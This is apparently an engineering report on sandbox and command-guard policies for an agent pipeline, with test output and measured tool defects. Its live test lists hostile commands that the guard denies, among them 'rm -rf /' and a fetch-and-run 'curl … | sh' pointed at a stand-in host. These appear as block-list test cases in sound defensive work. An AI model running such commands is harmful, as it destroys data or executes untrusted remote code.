# TB1 — Node policy: sandbox profiles, rails lock, destructive-command hook, adapter pins (ticket T6)

Sessions 2 and 3, 2026-10-24 (local). Box: WSL2, Linux 6.18.33.2-microsoft-standard-WSL2, bubblewrap
0.9.0. Pinned tools from TB0: vetto 0.6.5, ralon 0.1.7, dcg 0.15.3. Work landed as `8a724ce` (partial,
session 2, stopped by the soft gate) plus the T6 completion commit that carries this file. Nothing was
pushed (I1). No prep existed for this row (`specs/factory-step2-v1/prep/` absent).

Every block is `$ <command>`, its output, and `exit=<code>`. vetto runs in these blocks used a scratch
`HOME` under `~/.tb1m.*` (removed afterwards) with `.factory/cache` created and the project on a branch
`ticket/x`, for the reasons in §3 (real HOME fails, `--agent` refuses main). ANSI escapes are stripped.

## 1. DoD → evidence

| DoD item | Where | Proof |
|---|---|---|
| `factory/policy/build.toml`: deny all network, writes only to the worktree and the dependency cache, in vetto 0.6.5's format | `factory/policy/build.toml` (`[filesystem] allow_write = ["$PROJECT", "$HOME/.factory/cache"]`, `[network] mode = "off"`) | `make live` AC3 lines (§2); `make test` `vetto-policies` (only tables vetto 0.6.5 parses, write roots, mode pinned) |
| `factory/policy/agent.toml`: egress only to the adapter's API domain | `factory/policy/agent.toml` (`[network] mode = "strict"`, `allow` = fleet 1.12.0 claude-code `egressHosts`: `api.anthropic.com:443`, `console.anthropic.com:443`, `platform.claude.com:443`) | `make live` AC4: API reached; github.com, registry.npmjs.org, example.com denied |
| `factory/bin/lib/ralon-lock.sh` renders the lock from the ticket's `rails` | renders `<worktree>/agent.lock`, not `.ralon/<id>.lock` (ralon 0.1.7 reads `agent.lock` from `-C DIR`, patterns relative to it, `..` refused: ADR-0005 decision 1) | `make test` `lock-render`, `lock-apply`; `make live` ralon lines |
| `factory/policy/dcg.toml` in dcg v0.15.3's format | `factory/policy/dcg.toml` | `make test` `dcg-config`; `make live` dcg lines (config loads; 6 denies, 3 allows) |
| `factory/policy/adapters.json` (Q5): claude-code at this box's version, every other fleet adapter `null` | `{"claude-code": "2.1.280", codex, gemini, agy, jetski, opencode, pi, cursor, copilot: null}`; `claude --version` = `2.1.280 (Claude Code)` | `make test` `adapters-schema` |
| `version-check.sh` reads it, `pins_source` no longer null | new states `unpinned` (null on main) and `unlisted` (key missing), both exit 2; main pins must be exactly x.y.z, else `bad-pin` | `make test` `tests/test_version_check.sh` case `adapter-unpinned` ("pins_source is the file, no longer null") |
| `make test` covers the lock renderer and the adapters.json schema | `tests/test_policy.sh`: lock-render, lock-apply, adapters-schema, vetto-policies, vetto-net, dcg-config, fakes | §2 |
| live: build.toml denies `curl https://example.com`, allows a write inside the worktree, denies one outside | `tests/live/test_policy_live.sh` | §2 AC3 |
| live: agent.toml allows the adapter domain and denies another | same | §2 AC4 |
| live: ralon denies a write to a rail path and allows a non-rail path | same | §2 ralon |
| live: vetto refuses to start with a malformed profile (fail-closed) | same | §2 "malformed policy" (exit 125, the command never ran, the reason is the policy load failure) |
| fakes for each pinned tool, themselves tested (I4) | `tests/fakes/{vetto,ralon,dcg}` | `make test` `fakes` |

Added in session 3 (not in the DoD's list, needed to meet it): `factory/bin/lib/vetto-net.sh`. Session 3
found that `--agent claude` swaps agent.toml's network table for vetto's built-in agent allowlist (§3.6).
The session-2 live test missed it because its "another domain", example.com, is on neither list. The
helper renders `--net` from the file, so the file stays the one egress list. It refuses an unknown mode,
which vetto would accept silently. AC4 now also probes github.com and registry.npmjs.org, two hosts on
the preset list, and prints the leak without `--net` as an INFO negative control.

## 2. Gates on the final tree

```
$ make test 2>&1 | grep -E '^(PASS|FAIL)'
PASS tests/test_claim.sh
PASS tests/test_halt_rules.sh
PASS tests/test_halt.sh
PASS tests/test_janitor.sh
PASS tests/test_layout.sh
PASS tests/test_mirror.sh
PASS tests/test_policy.sh
PASS tests/test_post_merge.sh
PASS tests/test_summon.sh
PASS tests/test_version_check.sh
exit=0
```

```
$ make lint
(no output: shellcheck -S warning over every factory/ and tests/ shell file, then actionlint, both clean)
exit=0
```

Session 3 fixed five shellcheck warnings with disable comments that give the reason. All five were
false positives: SC2034 ×3 (variables read inside `eval` strings), SC2053 in `tests/fakes/ralon`
(the unquoted right-hand side is the intended glob match, as ralon does it), and SC2088 in
`tests/test_policy.sh` (a literal `~` is the input under test).

```
$ make live
test_policy_live
    ok   vetto is the pinned 0.6.5
    ok   ralon is the pinned 0.1.7
    ok   dcg is the pinned 0.15.3
    INFO bubblewrap 0.9.0; kernel 6.18.33.2-microsoft-standard-WSL2
    ok   outside any sandbox this host reaches example.com and api.anthropic.com (else a deny proves nothing)
    INFO build.toml session: vetto exit 125
    ok   build.toml: the command ran inside the sandbox
    ok   build.toml: curl https://example.com is denied (no connection: HTTP 000)
    ok   build.toml: a write inside the worktree lands
    ok   build.toml: a write outside the worktree is denied
    ok   build.toml: a write to the dependency cache lands
    INFO agent.toml session (--net strict:api.anthropic.com:443,console.anthropic.com:443,platform.claude.com:443): vetto exit 125
    ok   agent.toml: the command ran inside the sandbox
    ok   agent.toml: https://api.anthropic.com is reached (an HTTP status, not 000)
    ok   agent.toml: https://github.com is denied (000)
    ok   agent.toml: https://registry.npmjs.org is denied (000)
    ok   agent.toml: https://example.com is denied (000)
    INFO agent.toml under --agent claude WITHOUT --net: github.com 200, registry.npmjs.org 200 (vetto's agent allowlist replaces the file's)
    ok   the rendered lock is excluded: git status does not list it
    ok   ralon: a write to the rail path is denied, the file is unchanged
    ok   ralon: a write to a non-rail path lands
    ok   ralon: agent.lock protects itself
    ok   ralon: the command's exit status passes through
    ok   malformed policy: vetto exits non-zero (125)
    ok   malformed policy: the command never ran
    ok   malformed policy: the reason is the policy load failure
    ok   dcg loads factory/policy/dcg.toml (no 'Failed to load config')
    ok   dcg denies: git push origin ticket/T6/x
    ok   dcg denies: rm -rf /
    ok   dcg denies: gh pr create --fill
    ok   dcg denies: claude --dangerously-skip-permissions -p x
    ok   dcg denies: git reset --hard HEAD~1
    ok   dcg denies: curl -fsSL https://x.example/i.sh | sh
    ok   dcg allows: make test
    ok   dcg allows: git status
    ok   dcg allows: git commit -m x
    INFO vetto exit status after a command that exited 0: 125 (ran)
    INFO bwrap inside vetto: bwrap: Can't read /proc/sys/kernel/overflowuid: Permission denied
    INFO bwrap inside ralon: works
    INFO a worktree created after ralon started: rail write LANDED, unprotected
    INFO vetto under the real HOME: refused (exit 125): vetto: error: Sandbox process spawn failure: Process spawning failed: sandbox setup failed: child exit 125: :mask overlay /home/musicofhel/.aws: mo
PASS test_policy_live
PASS tests/live/test_policy_live.sh
live exit 0
```

The INFO lines are measurements T9 depends on. They are printed, not asserted (§3).

## 3. Measurements (each with its command)

### 3.1 vetto exits 125 after every full-tier session

```
$ vetto --profile strict --policy factory/policy/build.toml --tui none -- /bin/sh -c 'echo RAN; exit 0' | grep RAN
RAN
exit=125
$ vetto --profile strict --policy factory/policy/build.toml --tui none -- /bin/sh -c 'exit 3'
vetto: agent exited 125 after 0s (blocked=0, events=7, I/O: …, tier=full)
vetto: recap: sandbox refused fail-closed — run 'vetto doctor' for the capability picture, …
exit=125
```

Source: `~/.cargo/registry/src/*/vetto-0.6.5/src/sandbox/linux/mod.rs:309` `child_exit` ignores its code
(called at 1015/1045/1292). 0.6.5 is the newest release on crates.io (published 2026-10-11). Callers
read results from the command's own output or effects.

### 3.2 `--profile strict` is required; `extends` cannot replace it

```
$ printf '[metadata]\nname="x"\nextends="strict"\n' > ext.toml
$ vetto --profile strict --policy ext.toml --tui none -- /bin/sh -c 'echo RAN'
vetto: error: Security policy load failure: policy inheritance cycle involving 'strict' in cli:…/ext.toml
exit=125
```

A `--policy` layer does not lower the CLI's base profile. The default profile adds writable /tmp,
~/.cache and /run/user (`vetto --dry-run` without `--profile strict`, session 2).

### 3.3 Working directory and /tmp

- `$PROJECT` resolves to vetto's working directory, not the git top level. Session 2 used `--dry-run`
  from a subdirectory: the write root listed was the subdirectory. Run vetto from the worktree root.
- A cwd under /tmp: strict mounts a private tmpfs on /tmp, so the chdir fails silently:
  ```
  $ cd /tmp/tb1m.$$ && vetto --profile strict --policy factory/policy/build.toml --tui none -- /bin/sh -c 'echo RAN' | grep -E 'RAN|error|exited'
  vetto: agent exited 125 after 0s (blocked=0, events=7, I/O: …, tier=full)
  exit=125
  ```
  No `RAN`, no message. Keep worktrees and the live scratch out of /tmp; the live test uses
  `${FACTORY_LIVE_TMP:-$HOME/.cache}`.

### 3.4 A missing write root is dropped

```
$ printf '[metadata]\nname="x"\n[filesystem]\nallow_write=["$PROJECT","$HOME/nope"]\n' > miss.toml
$ vetto --profile strict --policy miss.toml --tui none -- /bin/sh -c 'echo RAN' | grep -E 'nope|dropped|RAN'
vetto: policy warning: allow_write path '…/home/nope' does not exist; dropped
RAN
exit=125
```

The caller creates `$HOME/.factory/cache` before the first build (build.toml header).

### 3.5 Malformed policy: fail-closed; typo'd mode: silently accepted

```
$ printf '[metadata]\nname="x"\n[bogus]\nk=1\n' > bad.toml
$ vetto --profile strict --policy bad.toml --tui none -- /bin/sh -c 'echo RAN' | grep -E 'RAN|error'
vetto: error: Security policy load failure: Policy compilation failed: failed to parse policy 'cli:…/bad.toml': TOML parse error at line 3, column 2
exit=125
$ printf '[metadata]\nname="x"\n[network]\nmode="offf"\n' > typo.toml
$ vetto --profile strict --policy typo.toml --tui none -- /bin/sh -c 'echo RAN' | grep RAN
RAN
exit=125
```

So `tests/test_policy.sh` pins the mode values, and `vetto-net.sh` refuses an unknown mode (exit 2).

### 3.6 Network: the file is enforced, unless `--agent claude` replaces it

`C` = curl each of github.com, registry.npmjs.org, example.com, api.anthropic.com and
platform.claude.com (`-w "$u=%{http_code}"`, 10 s), then `echo RAN`.

```
$ vetto --profile strict --policy factory/policy/agent.toml --tui none -- /bin/sh -c "$C" | grep -E '^https|RAN'
https://github.com/=000
https://registry.npmjs.org/=000
https://example.com/=000
https://api.anthropic.com/=404
https://platform.claude.com/=200
RAN
exit=125

$ vetto --profile strict --agent claude --policy factory/policy/agent.toml --tui none -- /bin/sh -c "$C2" | grep -E '^https|RAN'
# C2 = the same loop over github.com, registry.npmjs.org, claude.ai, api.anthropic.com
https://github.com/=200
https://registry.npmjs.org/=200
https://claude.ai/=403
https://api.anthropic.com/=404
RAN
exit=125
(identical with no --policy at all: vetto's built-in --agent claude allowlist)

$ vetto --profile strict --agent claude --policy factory/policy/agent.toml \
    --net strict:api.anthropic.com:443,console.anthropic.com:443,platform.claude.com:443 --tui none -- /bin/sh -c "$C" | grep -E '^https|RAN'
https://github.com/=000
https://registry.npmjs.org/=000
https://example.com/=000
https://api.anthropic.com/=404
https://platform.claude.com/=200
RAN
exit=125

$ vetto --profile strict --agent claude --policy factory/policy/agent.toml --net off --tui none -- /bin/sh -c 'curl … https://api.anthropic.com/; echo RAN' | grep -E 'API|RAN'
API=000
RAN
exit=125

$ vetto --profile strict --agent claude --policy factory/policy/agent.toml --tui none -- /bin/sh -c 'curl … http://api.anthropic.com/' | grep HTTP
HTTP=501
```

`--dry-run` does not show the file's network table:

```
$ vetto --profile strict --policy factory/policy/agent.toml --dry-run --tui none -- true | grep net:
  net:   off
$ vetto --profile strict --agent claude --policy factory/policy/agent.toml --dry-run --tui none -- true | grep net:
  net:   allowlist:api.anthropic.com,auth.anthropic.com,claude.ai,statsig.anthropic.com,platform.anthropic.com,registry.npmjs.org,pypi.org,files.pythonhosted.org,crates.io,index.crates.io,static.crates.io,proxy.golang.org,sum.golang.org,registry.yarnpkg.com,github.com,api.github.com,raw.githubusercontent.com,objects.githubusercontent.com
```

The first line says `off`, yet the same file's strict list is enforced (block above).

Decision: the model-turn invocation is `vetto --profile strict --agent claude --policy
factory/policy/agent.toml --net "$(factory/bin/lib/vetto-net.sh factory/policy/agent.toml)" …`. `--agent
claude` is needed because the strict profile otherwise masks ~/.claude. `vetto-net.sh` renders
`strict:<the file's allow list>`:

```
$ factory/bin/lib/vetto-net.sh factory/policy/agent.toml
strict:api.anthropic.com:443,console.anthropic.com:443,platform.claude.com:443
exit=0
$ factory/bin/lib/vetto-net.sh factory/policy/build.toml
off
exit=0
```

### 3.7 `--agent claude` git guard

```
$ git switch -c main && vetto --profile strict --agent claude --policy factory/policy/agent.toml --tui none -- /bin/sh -c 'echo RAN'
vetto: error: git_guard: working copy is on branch 'main'; refusing to run with write permissions (create a feature branch, e.g. 'git checkout -b feature/...')
exit=125
```

### 3.8 bwrap inside vetto: no; inside ralon: yes

From `make live` (§2): `bwrap inside vetto: bwrap: Can't read /proc/sys/kernel/overflowuid: Permission
denied`; `bwrap inside ralon: works`. In session 2, allowing that read in a policy only moved the failure
to "loopback: Failed to create NETLINK_ROUTE socket". fleet's repo-command plane runs bwrap with
`--unshare-net` (`@adlc/fleet lib/sandbox.mjs:157`), so **fleet cannot run inside vetto**. ADR-0005
decision 2 is rewritten: `ralon run -C <wt> -- fleet run …`, and vetto wraps only the loop's own steps.

### 3.9 The real HOME fails closed on this box

From `make live`: `vetto under the real HOME: refused (exit 125): … :mask overlay
/home/musicofhel/.aws: …`. `~/.aws` here is a symlink to a directory on `/mnt/c`. vetto binds /dev/null
over the masked path ("bind /dev/null over …/.aws: Not a directory"). Session 2 reproduced it with any
symlink-to-directory at `$HOME/.aws`. This is a vetto 0.6.5 defect. The wizard (T7) must detect it, and
T11 must name it. Changing Aaron's `~/.aws` is not the loop's call.

### 3.10 ralon 0.1.7

```
$ printf 'version: 1\nprotect:\n  - /rail/**\n' > agent.lock && mkdir rail
$ ralon check -C . rail/x
locked    rail/x  (matches `rail/**`)
exit=1
$ ralon run -C . -- /bin/sh -c 'exit 7'
ralon: 2 paths locked via the mount backend
ralon: warning: /mnt/wslg/distro/home/…/r is a second path to this project; writes through it are not restricted by either backend
exit=7
```

- The status passes through (`exit 7` → 7).
- The leading `/` is silently stripped (`/rail/**` matches as `rail/**`), so `ralon-lock.sh` refuses
  absolute globs itself.
- No lock, an empty lock or a refused pattern → 2. The fake copies this behaviour (`make test` `fakes`).
- From `make live`: a rail write is denied and the file is unchanged; a non-rail write lands;
  agent.lock protects itself. And `a worktree created after ralon started: rail write LANDED,
  unprotected`: the `.worktrees/*/` form covers only worktrees that exist when ralon starts, under the
  mount and landlock backends alike (session 2). fleet cuts its worker worktree mid-run, so T9 must not
  claim ralon covers it (ADR-0005 amendment, ralon 3).

### 3.11 The lock renderer

```
$ FACTORY_ADLC=tests/fakes/adlc FAKE_ADLC_TICKETS='[{"id":"T-rec","rails":["src/auth/**","docs/charter.md"]}]' \
    factory/bin/lib/ralon-lock.sh T-rec --worktree $W
# agent.lock for ticket T-rec, rendered by factory/bin/lib/ralon-lock.sh from the ticket's rails.
# ralon 0.1.7 policy file: patterns are relative to this file. Regenerate it; never edit it.
version: 1
protect:
  - "factory/policy/**"
  - ".worktrees/*/factory/policy/**"
  - "src/auth/**"
  - ".worktrees/*/src/auth/**"
  - "docs/charter.md"
  - ".worktrees/*/docs/charter.md"
exit=0
$ … rails ["../x"] …
ralon-lock: rail "../x" has a .. segment: ralon would refuse it
ralon-lock: ticket T-rec: refusing to render a lock with a rail ralon would refuse
exit=2
```

### 3.12 dcg 0.15.3

- A config that fails to load prints only `Warning: Failed to load config` and runs on defaults, even
  with `--robot`. Session 2 found this with a partial `[interactive]` table, which fails the load
  because every field is required, so dcg.toml has none. Unknown keys are ignored silently. The live
  test asserts the warning is absent.
- Robot output: `{schema_version, dcg_version, robot_mode, command, decision, mode?, reason?, rule_id?,
  pack_id?, source?, agent}`. Exit 1 = deny, 0 = allow.
- Accepted over-block: `echo git push` and `gh pr view` are denied too.

## 4. Records for later rows

- **T7 (join wizard):** `factory/nodes/manifest.schema.json`'s adapter enum has 4 names; fleet and
  adapters.json have 9. Reconcile it in T7. The sandbox probe needs a marker in the command's output
  (vetto's status is always 125). It must also detect the symlink-to-directory defect (§3.9).
- **T9 (run loop):** `ralon run -C <wt> -- fleet run …`. vetto wraps only the loop's own steps
  (build.toml for the local tamperguard/test pass; agent.toml with `--net` from `vetto-net.sh`).
  Never branch on vetto's status. `factory/skills/run/SKILL.md` still shows the SPEC-v0.2 sketch
  (`ralon run --lock .ralon/<id>.lock -- vetto --profile …`); T9 rewrites it from ADR-0005.
- **adapters.json is not on origin/main yet.** version-check reads it from `<remote>/<branch>`, so
  until the launching session pushes, `pins_source` on this box's real checkout stays null. The test
  proves the read against a fixture origin.
